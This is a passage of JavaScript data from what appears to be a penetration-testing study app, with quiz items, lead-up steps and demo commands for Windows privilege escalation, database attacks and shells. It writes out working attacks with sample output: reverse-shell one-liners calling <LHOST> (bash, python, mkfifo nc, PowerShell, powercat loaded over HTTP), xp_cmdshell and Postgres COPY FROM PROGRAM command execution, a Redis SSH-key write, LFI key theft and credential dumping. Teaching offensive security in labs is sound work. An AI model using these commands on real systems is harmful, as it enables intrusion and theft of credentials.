    "wesng-patch-gaps": {situation:"winpeas found no service, registry, or token lead, and systeminfo shows an old build. What now?", choices:["wesng-patch-gaps","windows-enum","seimpersonate","lsass-dump-onbox"], coach:{"windows-enum":"Already done, that is what came up dry on config paths. A missing-patch check is the fallback.","seimpersonate":"Only if you hold SeImpersonate, which the sweep did not show; with no privilege lead, kernel and patch exploits are the remaining angle.","lsass-dump-onbox":"Needs admin you do not have; a patch-gap exploit is a way to get there, not something you can do yet."}},
    "windows-persistence": {situation:"You just reached SYSTEM on a long-running lab box. What is a sensible next step?", choices:["windows-persistence","flag-hunt-windows","lsass-dump-onbox","windows-enum"], coach:{"flag-hunt-windows":"Grabbing the proof is the objective and comes first; persistence is the follow-up so a revert does not cost you the SYSTEM you just earned.","lsass-dump-onbox":"Worth doing now that you are SYSTEM, but in a long lab secure a way back in first so a revert does not set you back.","windows-enum":"You are already SYSTEM; the sweep was for finding the way up, which you have done."}},
    "lsass-dump-onbox": {situation:"You are local admin and want the credentials of other users who logged in. What do you do?", choices:["lsass-dump-onbox","dpapi-secrets","windows-old-hives","crack-mscache2"], coach:{"dpapi-secrets":"That recovers what one user saved; LSASS holds the live credentials of everyone currently signed in, a wider net now that you are admin.","windows-old-hives":"That gets local-account hashes from old files; LSASS has the domain users who logged in since boot, often including an admin.","crack-mscache2":"Cached domain logons are an offline target; LSASS gives you live hashes and tickets right now."}},
    "defense-enum": {situation:"You have a foothold and are about to upload winpeas and mimikatz. What should you check first?", choices:["defense-enum","windows-enum","lsass-dump-onbox","seimpersonate"], coach:{"windows-enum":"That IS winpeas, which you are about to upload; check what is watching before you drop a tool EDR flags on sight.","lsass-dump-onbox":"Dumping LSASS is exactly what EDR catches; knowing the defenses first decides whether and how you do it.","seimpersonate":"A privesc technique, not a pre-flight check; confirm the defenses before running tooling that might burn the shell."}}
  };
  Object.keys(WINDOWS_PRACTICE).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) { var pr = WINDOWS_PRACTICE[k]; OBOL.STUDY_FIXTURES[k].situation = pr.situation; OBOL.STUDY_FIXTURES[k].choices = pr.choices; OBOL.STUDY_FIXTURES[k].coach = pr.coach; } });

  // database lane: lead-ups, field notes, practice. DB attacks run from Kali over the network (local).
  var DATABASE_LEADUPS = {
    "mysql-login": [
      { key: "scan", label: "The scan found 3306", steps: [
        { title: "Spot the MySQL port", tool: "nmap", where: "local", cmd: "nmap -p 3306 <target>", out: "3306/tcp open  mysql", sig: "3306/tcp open  mysql", teach: "MySQL open means a login to try; defaults and reused passwords get you a prompt." } ] },
      { key: "loot", label: "A config file leaked a credential", steps: [
        { title: "A web config held DB creds", tool: "cat", where: "host", cmd: "cat /var/www/html/config.php | grep -i db", out: "$db_user = 'root'; $db_pass = 'S3cr3tDB';", sig: "$db_pass = 'S3cr3tDB'", teach: "A credential from the web root logs you straight into MySQL." } ] },
    ],
    "mysql-loot": [
      { key: "login", label: "You have a MySQL session", steps: [
        { title: "You reached the MySQL prompt", tool: "mysql", where: "local", cmd: "mysql -h <target> -u root -p'S3cr3tDB'", out: "Welcome to the MySQL monitor.\nmysql>", sig: "mysql>", teach: "With a session open, the app's own user table is the next, highest-value target." } ] },
    ],
    "mssql-login": [
      { key: "scan", label: "The scan found 1433", steps: [
        { title: "Spot the MSSQL port", tool: "nmap", where: "local", cmd: "nmap -p 1433 <target>", out: "1433/tcp open  ms-sql-s", sig: "1433/tcp open  ms-sql-s", teach: "MSSQL open plus any credential is a quiet way onto a Windows SQL box." } ] },
      { key: "domaincred", label: "You hold a domain credential", steps: [
        { title: "A share dump gave you a domain user", tool: "netexec", where: "local", cmd: "nxc smb <target> -u jdoe -p 'Spring2024!'", out: "SMB  <target>  445  SQL01  [+] corp.local\\jdoe", sig: "corp.local\\jdoe", teach: "MSSQL often trusts domain logins, so a domain credential logs straight in with -windows-auth." } ] },
    ],
    "mssql-xp-cmdshell": [
      { key: "sysadmin", label: "Your login is sysadmin", steps: [
        { title: "You confirmed sysadmin rights", tool: "mssqlclient", where: "local", cmd: "SQL> SELECT IS_SRVROLEMEMBER('sysadmin')", out: "-----------\n          1", sig: "          1", teach: "A 1 means sysadmin, which is exactly what enabling xp_cmdshell requires." } ] },
    ],
    "postgres-login": [
      { key: "scan", label: "The scan found 5432", steps: [
        { title: "Spot the PostgreSQL port", tool: "nmap", where: "local", cmd: "nmap -p 5432 <target>", out: "5432/tcp open  postgresql", sig: "5432/tcp open  postgresql", teach: "Postgres open means a login to try; postgres/postgres is a common default." } ] },
    ],
    "redis-enum": [
      { key: "scan", label: "The scan found 6379", steps: [
        { title: "Spot the Redis port", tool: "nmap", where: "local", cmd: "nmap -p 6379 <target>", out: "6379/tcp open  redis", sig: "6379/tcp open  redis", teach: "Redis open with no auth hands over its cache the moment you connect." } ] },
    ],
    "mongo-enum": [
      { key: "scan", label: "The scan found 27017", steps: [
        { title: "Spot the MongoDB port", tool: "nmap", where: "local", cmd: "nmap -p 27017 <target>", out: "27017/tcp open  mongod", sig: "27017/tcp open  mongod", teach: "Mongo open and unauthenticated means you can list and dump its data directly." } ] },
    ]
  };
  Object.keys(DATABASE_LEADUPS).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].leadup = DATABASE_LEADUPS[k]; });

  var DATABASE_HOW = {
    "mysql-login": {"lead":"MySQL on 3306 takes a username and password; default and reused creds get you a SQL prompt.","items":[
      {"t":"Connect with a credential","d":"mysql -h -u -p opens a session; try root with a blank or reused password first.","demo":[{"run":"mysql -h <target> -u root -p'S3cr3tDB'","out":"Welcome to the MySQL monitor.\nmysql>","sig":"mysql>"}],"note":"A prompt means you are in; enumerate the databases next."},
      {"t":"List databases and privileges","d":"show databases and the current grants reveal the app DB and what your account may do.","demo":[{"run":"mysql -h <target> -u root -p'S3cr3tDB' -e \"show databases; show grants;\"","out":"information_schema\nmysql\nwebapp\nGRANT ALL PRIVILEGES ON *.* TO 'root'","sig":"webapp"}],"note":"The webapp database holds the application's data and its user table."},
      {"t":"Check for FILE privilege","d":"A user with FILE can read local files (LOAD_FILE) or, if secure_file_priv allows, write a webshell with INTO OUTFILE.","demo":[{"run":"mysql -h <target> -u root -p'S3cr3tDB' -e \"select load_file('/etc/passwd');\"","out":"root:x:0:0:root:/root:/bin/bash","sig":"root:x:0:0"}],"note":"FILE read /etc/passwd; the same privilege can drop a PHP shell into the web root."}]},
    "mysql-loot": {"lead":"The app's own user table is the prize: dump it, crack the hashes, reuse the passwords.","items":[
      {"t":"Find the user table","d":"Columns named user, pass, or email across the app DB point at the credential store.","demo":[{"run":"mysql -h <target> -u root -p'S3cr3tDB' webapp -e \"show tables;\"","out":"posts\nsessions\nusers","sig":"users"}],"note":"The users table is the one to dump."},
      {"t":"Dump the credentials","d":"Select the username and password columns; note the hash format for cracking.","demo":[{"run":"mysql -h <target> -u root -p'S3cr3tDB' webapp -e \"select username,password from users;\"","out":"admin  8d6e34f2a1c05b9e7d3f6a2b4c8e1d09","sig":"8d6e34f2a1c05b9e7d3f6a2b4c8e1d09"}],"note":"admin's password is an unsalted MD5; identify it, then crack it."},
      {"t":"Crack and reuse","d":"Feed the hashes to hashcat with the right mode; a cracked admin password often reuses for SSH or the app.","demo":[{"run":"hashcat -m 0 hashes.txt rockyou.txt","out":"8d6e34f2a1c05b9e7d3f6a2b4c8e1d09:Summer2024","sig":":Summer2024"}],"note":"admin:Summer2024 is a real credential; try it on SSH and every other service."}]},
    "mssql-login": {"lead":"MSSQL on 1433 takes SQL or Windows auth; impacket-mssqlclient is the cleanest way in.","items":[
      {"t":"Log in with mssqlclient","d":"impacket-mssqlclient connects with SQL auth (sa) or -windows-auth for a domain credential.","demo":[{"run":"impacket-mssqlclient sa:'P@ssw0rd'@<target>","out":"[*] Encryption required, switching to TLS\nSQL>","sig":"SQL>"}],"note":"The SQL> prompt means you are in; check your role next."},
      {"t":"Check for sysadmin","d":"IS_SRVROLEMEMBER('sysadmin') returns 1 if your login can enable xp_cmdshell.","demo":[{"run":"SQL> SELECT IS_SRVROLEMEMBER('sysadmin')","out":"-----------\n          1","sig":"          1"}],"note":"A 1 means sysadmin: xp_cmdshell command execution is available."},
      {"t":"Try a domain credential","d":"-windows-auth logs in with a domain account; MSSQL often trusts the whole domain.","demo":[{"run":"impacket-mssqlclient corp.local/jdoe:'Spring2024!'@<target> -windows-auth","out":"[*] ENVCHANGE(DATABASE)\nSQL>","sig":"SQL>"}],"note":"A domain user that can log into MSSQL is a common, quiet way onto a SQL box."}]},
    "mssql-xp-cmdshell": {"lead":"With sysadmin, enable xp_cmdshell and run OS commands as the SQL service account.","items":[
      {"t":"Enable xp_cmdshell","d":"It is off by default; sp_configure turns it on in two steps (show advanced, then the feature).","demo":[{"run":"SQL> EXEC sp_configure 'show advanced options',1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE;","out":"Configuration option 'xp_cmdshell' changed from 0 to 1.","sig":"changed from 0 to 1"}],"note":"xp_cmdshell is now enabled; you can run shell commands through it."},
      {"t":"Run a command","d":"EXEC xp_cmdshell runs the command and returns its output in the result set.","demo":[{"run":"SQL> EXEC xp_cmdshell 'whoami'","out":"nt service\\mssqlserver","sig":"nt service\\mssqlserver"}],"note":"Commands run as the SQL service account, often one that holds SeImpersonate."},
      {"t":"Get a reverse shell","d":"Point xp_cmdshell at a PowerShell download cradle or a served exe to land an interactive shell.","demo":[{"run":"SQL> EXEC xp_cmdshell 'powershell -e <base64 revshell>'","out":"(on your listener)  nt service\\mssqlserver","sig":"nt service\\mssqlserver"}],"note":"The service-account shell is your foothold; SeImpersonate then takes you to SYSTEM."}]},
    "postgres-login": {"lead":"PostgreSQL on 5432 takes a credential; psql gets you in, and old versions give RCE.","items":[
      {"t":"Connect with psql","d":"psql with PGPASSWORD opens a session; postgres/postgres is a common default.","demo":[{"run":"PGPASSWORD=postgres psql -h <target> -U postgres","out":"psql (11.7)\npostgres=#","sig":"postgres=#"}],"note":"The postgres=# prompt (note the #) means you are a superuser."},
      {"t":"Check the version","d":"select version() decides your options; 9.3 and later allow COPY FROM PROGRAM RCE for a superuser.","demo":[{"run":"postgres=# SELECT version();","out":"PostgreSQL 11.7 on x86_64-pc-linux-gnu","sig":"PostgreSQL 11.7"}],"note":"11.7 supports COPY FROM PROGRAM, so a superuser here has command execution."},
      {"t":"Run a command via COPY","d":"COPY ... FROM PROGRAM runs a shell command as the postgres user and captures its output.","demo":[{"run":"postgres=# CREATE TABLE c(o text); COPY c FROM PROGRAM 'id'; SELECT * FROM c;","out":"uid=114(postgres) gid=120(postgres) groups=120(postgres)","sig":"uid=114(postgres)"}],"note":"Command execution as the postgres user; escalate from there."}]},
    "redis-enum": {"lead":"Redis on 6379 is often open with no AUTH; read the cache, then abuse a writable instance.","items":[
      {"t":"Connect and read server info","d":"redis-cli with no password confirms open access; INFO reveals the version and config file.","demo":[{"run":"redis-cli -h <target> INFO server","out":"redis_version:5.0.7\nconfig_file:/etc/redis/redis.conf","sig":"redis_version:5.0.7"}],"note":"No AUTH error means it is wide open; now mine the keys."},
      {"t":"Dump cached secrets","d":"KEYS * lists everything; sessions, tokens, and cached credentials are common and valuable.","demo":[{"run":"redis-cli -h <target> KEYS '*'","out":"session:ab12cd\napi_token\nuser:1:password","sig":"user:1:password"}],"note":"A cached password key is a direct credential; GET it to read the value."},
      {"t":"Write an SSH key for RCE","d":"If writable and you know a path, point dir and dbfilename at .ssh and SAVE your key into authorized_keys.","demo":[{"run":"redis-cli -h <target> config set dir /var/lib/redis/.ssh\nredis-cli -h <target> config set dbfilename authorized_keys","out":"OK\nOK","sig":"OK\nOK"}],"note":"With dir and dbfilename aimed at .ssh, SAVE writes your key; then SSH in as the redis user."}]},
    "mongo-enum": {"lead":"MongoDB on 27017 with no auth lists databases and dumps collections outright.","items":[
      {"t":"Connect and list databases","d":"mongosh (or the legacy mongo client) with no auth shows every database.","demo":[{"run":"mongosh --host <target> --eval \"db.getMongo().getDBNames()\"","out":"[ 'admin', 'config', 'local', 'webapp' ]","sig":"webapp"}],"note":"The webapp database holds the application's collections; switch to it."},
      {"t":"Dump a collection","d":"find() on the users collection spills documents, including any stored credentials.","demo":[{"run":"mongosh --host <target> webapp --eval \"db.users.find()\"","out":"{ _id: 1, user: 'admin', pass: 'S3cr3tM0ngo' }","sig":"pass: 'S3cr3tM0ngo'"}],"note":"A plaintext password in a document is a direct credential to reuse."},
      {"t":"Export everything offline","d":"mongodump pulls the whole database to disk so you can grep it for secrets at leisure.","demo":[{"run":"mongodump --host <target> --db webapp --out loot/","out":"done dumping webapp.users (142 documents)","sig":"done dumping webapp.users"}],"note":"The full dump lets you mine every collection for credentials offline."}]}
  };
  Object.keys(DATABASE_HOW).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].how = DATABASE_HOW[k]; });

  var DATABASE_PRACTICE = {
    "oracle-tns": {"situation": "A scan shows 1521/tcp open and nmap's oracle-sid-brute returned the SID ORCL. What is the next move?", "choices": ["oracle-tns", "mysql-login", "crack-identify", "nmap-vuln-scripts"], "coach": {"mysql-login": "Wrong database; this is Oracle on 1521, so guess Oracle default accounts against the SID you found.", "crack-identify": "You have no hash yet; first get a login by guessing Oracle defaults with odat.", "nmap-vuln-scripts": "You already have the SID from the TNS scripts; now attack the login rather than re-scanning."}},
    "elasticsearch-enum": {"situation": "A scan shows 9200/tcp open and curl to the root returns a JSON banner reading version 6.8.0. What now?", "choices": ["elasticsearch-enum", "mongo-enum", "sqli-basics", "nmap-vuln-scripts"], "coach": {"mongo-enum": "Different data store; this is Elasticsearch on 9200, so list its indices over the REST API.", "sqli-basics": "There is no SQL here; Elasticsearch speaks a JSON HTTP API, so dump the indices with curl.", "nmap-vuln-scripts": "6.8 has no unauthenticated RCE, so a vuln scan adds little; read the indices for data instead."}},
    "memcached-enum": {"situation": "A scan shows 11211/tcp open and nmap's memcached-info confirms an unauthenticated memcached 1.5.6. What do you do?", "choices": ["memcached-enum", "redis-enum", "mongo-enum", "crack-identify"], "coach": {"redis-enum": "Different key-value store; this is memcached on 11211, so walk it with stats items and cachedump.", "mongo-enum": "Wrong service; memcached is a flat cache, not a document database, so dump its keys over the text protocol.", "crack-identify": "You may not need to crack anything; a cached session token is replayed directly, no password required."}},
    "mysql-login": {situation:"nmap shows 3306 open and you have no credentials. What do you try first?", choices:["mysql-login","mysql-loot","online-brute-ssh","mssql-login"], coach:{"mysql-loot":"That comes after you are in; first get a session with a default or reused credential.","online-brute-ssh":"Different service. 3306 is MySQL, so try its defaults (root with a blank or weak password) before brute-forcing anything.","mssql-login":"That is MSSQL on 1433; 3306 is MySQL, a different client and different defaults."}},
    "mysql-loot": {situation:"You have a root MySQL session on the app database. What is the highest-value move?", choices:["mysql-loot","crack-identify","mysql-login","mssql-xp-cmdshell"], coach:{"crack-identify":"That comes after you dump the hashes; first pull the user table out of the database.","mysql-login":"Already done, you are in. Now loot the tables.","mssql-xp-cmdshell":"Wrong engine. MySQL has no xp_cmdshell; its win is the credential table, not command execution."}},
    "mssql-login": {situation:"1433 is open and you hold a domain credential for jdoe. How do you get a SQL prompt?", choices:["mssql-login","mysql-login","mssql-xp-cmdshell","password-spray"], coach:{"mysql-login":"That is the MySQL client on 3306; 1433 is MSSQL, so use mssqlclient with -windows-auth.","mssql-xp-cmdshell":"That needs a session and sysadmin first; logging in is the step before it.","password-spray":"You already hold a credential; use it against MSSQL rather than spraying for a new one."}},
    "mssql-xp-cmdshell": {situation:"Your MSSQL login returns 1 for IS_SRVROLEMEMBER('sysadmin'). What now?", choices:["mssql-xp-cmdshell","mssql-login","seimpersonate","mysql-loot"], coach:{"mssql-login":"Already done, you are in as sysadmin. Now turn that into command execution.","seimpersonate":"That is the next step after you land a shell as the SQL service account; xp_cmdshell is how you get that shell.","mysql-loot":"Wrong engine. Sysadmin on MSSQL means xp_cmdshell, not a MySQL table dump."}},
    "postgres-login": {situation:"5432 is open, postgres/postgres works, and version() shows 11.7. What does that enable?", choices:["postgres-login","mssql-xp-cmdshell","mysql-login","crack-shadow"], coach:{"mssql-xp-cmdshell":"Different engine. Postgres uses COPY FROM PROGRAM for RCE, not xp_cmdshell.","mysql-login":"That is MySQL on 3306; you are already logged into Postgres on 5432.","crack-shadow":"No hashes to crack here; a superuser on Postgres 11 has direct command execution via COPY."}},
    "redis-enum": {situation:"6379 is open and redis-cli connects with no password. What is the first move?", choices:["redis-enum","mongo-enum","mysql-login","content-discovery"], coach:{"mongo-enum":"That is MongoDB on 27017; 6379 is Redis, a key-value store you enumerate with redis-cli.","mysql-login":"Different service. Redis has no SQL; you read keys with redis-cli.","content-discovery":"That is for web; the open Redis in front of you gives up its cache directly."}},
    "mongo-enum": {situation:"27017 is open and unauthenticated. What do you do?", choices:["mongo-enum","redis-enum","mysql-login","nosql-injection"], coach:{"redis-enum":"That is Redis on 6379; 27017 is MongoDB, enumerated with mongosh.","mysql-login":"Different engine. Mongo is a document store with no SQL login; just connect and read.","nosql-injection":"That abuses an app's query handling; here Mongo is directly exposed, so list and dump the collections."}}
  };
  Object.keys(DATABASE_PRACTICE).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) { var pr = DATABASE_PRACTICE[k]; OBOL.STUDY_FIXTURES[k].situation = pr.situation; OBOL.STUDY_FIXTURES[k].choices = pr.choices; OBOL.STUDY_FIXTURES[k].coach = pr.coach; } });

  // === SHELLS LANE =================================================================================
  var SHELLS_LEADUPS = {
    "ssh-key-login": [
      { key: "lfi", label: "You read the key through an LFI", steps: [
        { title: "Confirm the file-read bug", tool: "curl", where: "local", cmd: "curl -s 'http://10.10.10.10/view.php?page=/etc/passwd'", out: "root:x:0:0:root:/root:/bin/bash\nbob:x:1000:1000:bob:/home/bob:/bin/bash", sig: "bob:x:1000:1000", teach: "A read of /etc/passwd names the users with real shells; bob has a home, so bob has a key worth trying for." },
        { title: "Pull bob's private key", tool: "curl", where: "local", cmd: "curl -s 'http://10.10.10.10/view.php?page=/home/bob/.ssh/id_rsa' -o id_rsa", out: "-----BEGIN OPENSSH PRIVATE KEY-----\nb3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAAAMwAAAAtzc2gtZW...", sig: "BEGIN OPENSSH PRIVATE KEY", teach: "The BEGIN line proves you captured a real key, not a 404 page; save it and log in next." } ] },
      { key: "loot", label: "You found it in looted files", steps: [
        { title: "Spot a key in the loot", tool: "ls", where: "local", cmd: "ls -la loot/home/bob/.ssh/", out: "-rw------- 1 kali kali 2602 id_rsa\n-rw-r--r-- 1 kali kali  564 id_rsa.pub", sig: "id_rsa", teach: "id_rsa is the private half; the matching id_rsa.pub tells you which account it belongs to." },
        { title: "Read whose key it is", tool: "cat", where: "local", cmd: "cat loot/home/bob/.ssh/id_rsa.pub", out: "ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQC7vK9mQ2n5rT8wFz1aXpYbH3jN0eLdR4cS6uV bob@target", sig: "bob@target", teach: "The comment at the end of the public key usually carries user@host, pointing you at the account to try first." } ] },
    ],
    "shell-listener": [
      { key: "rce", label: "You confirmed command execution", steps: [
        { title: "A web bug runs your commands", tool: "curl", where: "local", cmd: "curl -s 'http://10.10.10.10/cmd.php?c=id'", out: "uid=33(www-data) gid=33(www-data) groups=33(www-data)", sig: "www-data", teach: "You can run commands as www-data; to turn that into a shell you need a catcher bound before you fire the callback." } ] },
    ],
    "shell-revshell-linux": [
      { key: "webrce", label: "A web bug runs your commands", steps: [
        { title: "Command injection confirmed", tool: "curl", where: "local", cmd: "curl -s 'http://10.10.10.10/ping.php?host=;id'", out: "uid=33(www-data) gid=33(www-data) groups=33(www-data)", sig: "www-data", teach: "The app runs your appended command; now have it run a reverse-shell one-liner instead of id." } ] },
      { key: "listener", label: "Your catcher is already up", steps: [
        { title: "The listener is bound", tool: "nc", where: "local", cmd: "rlwrap nc -lvnp 4444", out: "listening on [any] 4444 ...", sig: "listening on [any] 4444", teach: "With the catcher waiting, deliver the Linux payload and it lands here as an interactive prompt." } ] },
    ],
    "shell-revshell-windows": [
      { key: "webrce", label: "A Windows web app runs your commands", steps: [
        { title: "Command execution on an ASPX upload", tool: "curl", where: "local", cmd: "curl -s 'http://10.10.10.10/upload.aspx?cmd=whoami'", out: "iis apppool\\webapp", sig: "iis apppool\\webapp", teach: "You run commands as the app-pool identity; swap whoami for a PowerShell callback to get a shell." } ] },
      { key: "listener", label: "Your catcher is already up", steps: [
        { title: "The listener is bound", tool: "nc", where: "local", cmd: "rlwrap nc -lvnp 4444", out: "listening on [any] 4444 ...", sig: "listening on [any] 4444", teach: "Fire the PowerShell payload and it dials back here as the service account." } ] },
    ],
    "shell-pty-upgrade": [
      { key: "caught", label: "You just caught a raw shell", steps: [
        { title: "The callback landed", tool: "nc", where: "local", cmd: "rlwrap nc -lvnp 4444", out: "listening on [any] 4444 ...\nconnect to [<LHOST>] from (UNKNOWN) [10.10.10.10] 51124\n$ ", sig: "connect to", teach: "You have a shell, but it is line-buffered with no job control; upgrade it before you touch su, ssh, or an editor." } ] },
    ],
    "linux-remote-exec": [
      { key: "creds", label: "You cracked or looted a password", steps: [
        { title: "A credential turned up", tool: "hashcat", where: "local", cmd: "hashcat -m 0 hashes.txt rockyou.txt --show", out: "b7e2c1f94a8d60e35f2a1c7b9d04e8a6:Autumn2026!", sig: ":Autumn2026!", teach: "A cracked password for bob plus SSH open means you can run commands remotely without a fragile shell." } ] },
      { key: "key", label: "You recovered a private key", steps: [
        { title: "You hold bob's key", tool: "ssh", where: "local", cmd: "ssh -i id_rsa -o StrictHostKeyChecking=no bob@10.10.10.10 id", out: "uid=1000(bob) gid=1000(bob) groups=1000(bob),27(sudo)", sig: "uid=1000(bob)", teach: "The same key runs single commands non-interactively, ideal for scripted enumeration." } ] },
    ]
  };
  Object.keys(SHELLS_LEADUPS).forEach(function (k) { if (OBOL.STUDY_FIXTURES[k]) OBOL.STUDY_FIXTURES[k].leadup = SHELLS_LEADUPS[k]; });

  var SHELLS_HOW = {
    "ssh-key-login": {"lead":"A looted key only helps if SSH accepts it. Three things trip people up: file permissions, the right username, and keys that are themselves encrypted.","items":[
      {"t":"Permissions must be tight","d":"SSH ignores a private key that other users can read and throws a confusing 'too open' refusal, which is not an auth failure.","demo":[{"run":"ssh -i id_rsa bob@10.10.10.10","out":"Permissions 0644 for 'id_rsa' are too open.\nThis private key will be ignored.\nbob@10.10.10.10: Permission denied (publickey).","sig":"too open"}],"note":"chmod 600 id_rsa, then log in again."},
      {"t":"Find the right account","d":"A key logs into one user. Guess it from the key's path, the .pub comment, enumerated users, or the box theme, and confirm by running id inline.","demo":[{"run":"chmod 600 id_rsa && ssh -i id_rsa -o StrictHostKeyChecking=no bob@10.10.10.10 id","out":"uid=1000(bob) gid=1000(bob) groups=1000(bob),27(sudo)","sig":"uid=1000(bob)"}],"note":"bob is in the sudo group, a privesc lead to chase once you land."},
      {"t":"Crack an encrypted key","d":"If SSH asks for a passphrase, the key is encrypted. Turn it into a hash with ssh2john and crack it before use.","demo":[{"run":"ssh2john id_rsa > id_rsa.hash && john --wordlist=rockyou.txt id_rsa.hash","out":"Using default input encoding: UTF-8\nautumn2026       (id_rsa)\n1g 0:00:00:03 DONE","sig":"(id_rsa)"}],"note":"The recovered passphrase unlocks the key; now ssh -i id_rsa works."}]},
    "shell-listener": {"lead":"The catcher must be bound before the payload fires. netcat is the default; a few habits make the shell you catch far nicer to use.","items":[
      {"t":"Plain netcat listener","d":"nc -lvnp binds a port and prints the source when a shell connects: -l listen, -v verbose, -n no DNS, -p port.","demo":[{"run":"nc -lvnp 4444","out":"listening on [any] 4444 ...","sig":"listening on [any] 4444"}],"note":"Verbose mode prints the connect line so you know the callback arrived."},
      {"t":"Wrap it in rlwrap","d":"A raw nc shell has no history or arrow keys. rlwrap adds readline so you can recall and edit commands the moment the shell lands.","demo":[{"run":"rlwrap nc -lvnp 4444","out":"listening on [any] 4444 ...\nconnect to [<LHOST>] from (UNKNOWN) [10.10.10.10] 51124","sig":"connect to [<LHOST>]"}],"note":"History and arrows work now, before you even upgrade to a PTY."},
      {"t":"Catch many shells with pwncat","d":"pwncat-cs listens like nc but auto-stabilises the PTY and survives drops, worth it on a flaky target.","demo":[{"run":"pwncat-cs -lp 4444","out":"[+] bound to 0.0.0.0:4444\n[+] received connection from 10.10.10.10:51125","sig":"received connection from"}],"note":"pwncat upgrades the shell for you; handy when a box keeps dropping the callback."}]},
    "shell-revshell-linux": {"lead":"Deliver the payload on the target after your listener is up. Match it to what the box actually has installed.","items":[
      {"t":"Bash /dev/tcp one-liner","d":"If bash is present, /dev/tcp opens the socket with no extra binary; the classic exam payload.","demo":[{"run":"bash -c 'bash -i >& /dev/tcp/<LHOST>/4444 0>&1'","out":"bash: cannot set terminal process group\nwww-data@web:/var/www/html$","sig":"www-data@web"}],"note":"A prompt on your listener means it worked; upgrade to a PTY next."},
      {"t":"Python when bash is missing","d":"A stripped box may lack bash's /dev/tcp; python3 builds the socket and spawns a shell instead.","demo":[{"run":"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"<LHOST>\",4444));[os.dup2(s.fileno(),f) for f in(0,1,2)];subprocess.call([\"/bin/sh\"])'","out":"$ id\nuid=33(www-data) gid=33(www-data)","sig":"uid=33(www-data)"}],"note":"Carry two or three payloads so one missing interpreter does not waste the RCE."},
      {"t":"nc / mkfifo fallback","d":"If only a limited nc is present, a mkfifo named-pipe pattern gives a reliable shell without -e.","demo":[{"run":"rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc <LHOST> 4444 >/tmp/f","out":"/bin/sh: 0: can't access tty; job control turned off\n$","sig":"can't access tty"}],"note":"This works where nc has no -e; the tty warning is normal, upgrade the shell after."}]},
    "shell-revshell-windows": {"lead":"Same two beats as Linux, listener first. The extra problem is Defender, so know a couple of variants and check your defense-enum notes before you fire.","items":[
      {"t":"PowerShell TCP one-liner","d":"The standard socket-and-pipe client sends a PowerShell session back; stock copies are often flagged on sight.","demo":[{"run":"powershell -nop -w hidden -c \"$c=New-Object Net.Sockets.TCPClient('<LHOST>',4444);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){$d=(New-Object Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$s.Write(([Text.Encoding]::ASCII).GetBytes($sb),0,$sb.Length);$s.Flush()}\"","out":"PS C:\\inetpub\\wwwroot> whoami\niis apppool\\webapp","sig":"iis apppool\\webapp"}],"note":"You land as the app-pool identity; defense-enum tells you if this payload will trip AV."},
      {"t":"powercat, re-staged over HTTP","d":"powercat is a function you load then call; cleaner than the raw one-liner and easy to re-stage from your box.","demo":[{"run":"powershell -c \"IEX(New-Object Net.WebClient).DownloadString('http://<LHOST>/powercat.ps1');powercat -c <LHOST> -p 4444 -e cmd\"","out":"Microsoft Windows [Version 10.0.19042.1348]\nC:\\inetpub\\wwwroot>","sig":"C:\\inetpub\\wwwroot>"}],"note":"Loading over HTTP keeps the payload off disk; still check AV state first."},
      {"t":"nc.exe when you can upload","d":"If you can drop a binary, nc.exe -e gives the simplest callback and dodges PowerShell logging entirely.","demo":[{"run":"nc.exe <LHOST> 4444 -e cmd.exe","out":"Microsoft Windows [Version 10.0.19042.1348]\n(c) Microsoft Corporation. All rights reserved.\n\nC:\\Windows\\system32>","sig":"C:\\Windows\\system32>"}],"note":"A cmd prompt as the service account; upload nc.exe over SMB or a web upload first."}]},
    "shell-pty-upgrade": {"lead":"A raw shell has no job control, arrows, or tab-complete and dies on Ctrl-C. Fix it in two halves: spawn a PTY on the target, then repair your own terminal.","items":[
      {"t":"Spawn a PTY on the target","d":"python (2 or 3) spawns a real pty so the remote shell has a controlling terminal; script and socat work when python is absent.","demo":[{"run":"python3 -c 'import pty;pty.spawn(\"/bin/bash\")'","out":"www-data@web:/var/www/html$ ","sig":"www-data@web"}],"note":"The prompt behaves like a terminal now, but your local side is still raw; fix that next."},
      {"t":"Repair your local terminal","d":"Background with Ctrl-Z, set your terminal raw so keys pass through, foreground it, then fix TERM and size.","demo":[{"run":"# press Ctrl-Z, then on your box:\nstty raw -echo; fg\n# back in the shell:\nexport TERM=xterm; stty rows 50 cols 200","out":"[1]+  Stopped                 rlwrap nc -lvnp 4444\nwww-data@web:/var/www/html$ ","sig":"www-data@web"}],"note":"Now Ctrl-C, arrows, tab-complete, and su all behave."},
      {"t":"No python? use script or socat","d":"script -qc /bin/bash /dev/null forces a pty without python; a socat pty pair is fully interactive when socat is on both ends.","demo":[{"run":"script -qc /bin/bash /dev/null","out":"www-data@web:/var/www/html$ id\nuid=33(www-data) gid=33(www-data)","sig":"uid=33(www-data)"}],"note":"A fallback for stripped boxes; socat tty is the gold standard when it is available."}]},
    "linux-remote-exec": {"lead":"With creds and SSH open, run commands non-interactively. Each call is clean and scriptable, with no fragile session to babysit.","items":[
      {"t":"Run a single command","d":"sshpass feeds the password so one SSH call runs a command and returns; perfect for a quick id or sudo -l.","demo":[{"run":"sshpass -p 'Autumn2026!' ssh -o StrictHostKeyChecking=no bob@10.10.10.10 id","out":"uid=1000(bob) gid=1000(bob) groups=1000(bob),27(sudo)","sig":"uid=1000(bob)"}],"note":"bob is in sudo; check sudo -l next for a direct path to root."},
